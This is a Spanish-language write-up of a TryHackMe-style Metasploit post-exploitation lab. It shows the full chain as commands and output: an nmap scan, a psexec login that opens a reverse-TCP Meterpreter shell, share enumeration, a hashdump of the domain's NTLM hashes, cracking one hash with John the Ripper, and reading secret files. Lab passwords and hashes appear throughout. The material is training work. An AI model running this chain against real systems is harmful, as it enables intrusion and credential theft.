---
tags:
  - Metasploit
  - Meterpreter
  - comandos
---
---
# [Apartado](obsidian://open?vault=Google%20drive-Odsidian&file=Ciberseguridad%2FTHM%2FFundamentos%20de%20la%20explotaci%C3%B3n%2FMetasploit%20Meterpreter%2FDesaf%C3%ADo%20post-explotaci%C3%B3n)

---
Primero vamos a comenzar con un escaneo de puertos para ver los servicios que tiene esta máquina activos
```sh imp=13
root@ip-10-10-135-18:~# nmap -sS -sV 10.10.15.123
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-08 13:44 BST
Nmap scan report for 10.10.15.123
Host is up (0.00041s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 12:45:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: FLASH.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/8%Time=684585D6%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
MAC Address: 02:E8:31:4E:80:B1 (Unknown)
Service Info: Host: ACME-TEST; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.68 seconds
```

Ya que esta practica de post-explotación el acceso a esta ya esta hecha, dicho esto el usuario es `ballen` y la contraseña `Password1`. Por lo que iniciaremos metasploit con el modulo `exploit/windows/ smb /psexec`. En el vamos a poner los datos que ya tenemos, `RHOST`, `SMBUSER` y `SMBPASS`
```sh imp=2,4,6,31,35,36
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.15.123
RHOSTS => 10.10.15.123
msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
SMBPASS => Password1
msf6 exploit(windows/smb/psexec) > set SMBUSER ballen
SMBUSER => ballen
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write
                                                    folder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     10.10.15.123     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit
                                         .html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    Password1        no        The password for the specified username
   SMBUser    ballen           no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.135.18     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Y ejecutamos el exploit obteniendo una shell de meterpreter.
```sh imp=11
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.10.135.18:4444 
[*] 10.10.15.123:445 - Connecting to the server...
[*] 10.10.15.123:445 - Authenticating to 10.10.15.123:445 as user 'ballen'...
[*] 10.10.15.123:445 - Selecting PowerShell target
[*] 10.10.15.123:445 - Executing the payload...
[+] 10.10.15.123:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.15.123
[*] Meterpreter session 1 opened (10.10.135.18:4444 -> 10.10.15.123:64207) at 2025-06-08 14:00:00 +0100

meterpreter >
```

Ahora que ya estamos dentro del sistema vamos a recolectar más información del sistema, la primera pregunta que se nos hace es:
## ¿Cual es el nombre de la computadora?  + ¿Cuál es el dominio objetivo?
Esto lo vamos a averiguar con el comando `sysinfo`:
```sh imp=2,6
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
```
## ¿Cuál es el nombre del recurso compartido probablemente creado por el usuario?  
Ahora para ver que recurso compartido esta por el usuario, vamos a poner en background nuestra shell, y vamos a iniciar el modulo `post/windows/gather/enum_shares` y le vamos a indicar que la session es la 1.
```sh imp=3,33-35 mar=2,19
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares 
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_shares) > set session 1
session => 1
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.10.15.123)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```

## ¿Cuál es el hash NTLM del usuario jchambers?  
Para esto vamos a utilizar `hashdump`
```sh mar=1 imp=6
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:d90355c5de5ac9dd3cbe0db4acc8e09b:::
```

## ¿Cuál es la contraseña de texto sin cifrar del usuario jchambers?  
Ahora vamos a hacer un ataque de diccionario con john, para ello primero tendremos que hacer un archivo con el texto, lo vamos a denominar `hash.txt`
```txt title="Hash.txt"
69596c7aa1e8daee17f8e78870e25a5c
```

Ahora, vamos a romper este cifrado NT 
```sh imp=6
root@ip-10-10-135-18:~# john --wordlist=/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt --format=NT hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)
1g 0:00:00:00 DONE (2025-06-08 14:25) 50.00g/s 2572Kp/s 2572Kc/s 2572KC/s blackrose1..2pac4ever
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

## ¿Dónde se encuentra el archivo "secrets.txt"? (Ruta completa del archivo)  
Para esto vamos a utilizar el comando search
```sh imp=7 mar=1
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100
```
## ¿Cuál es la contraseña de Twitter revelada en el archivo "secrets.txt"?  
para esto, vamos a hacer un cat entre comillas dobles
```sh mar=1 imp=2
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!
```

## ¿Dónde se encuentra el archivo "realsecret.txt"?  (Ruta completa del archivo)  
Para esto nuevamente vamos a utilizar el comando search
```sh mar=1 imp=7
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100
```

## ¿Cuál es el verdadero secreto?  
para esto, vamos a hacer un cat entre comillas dobles
```sh imp=2 mar=1
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
The Flash is the fastest man alive
```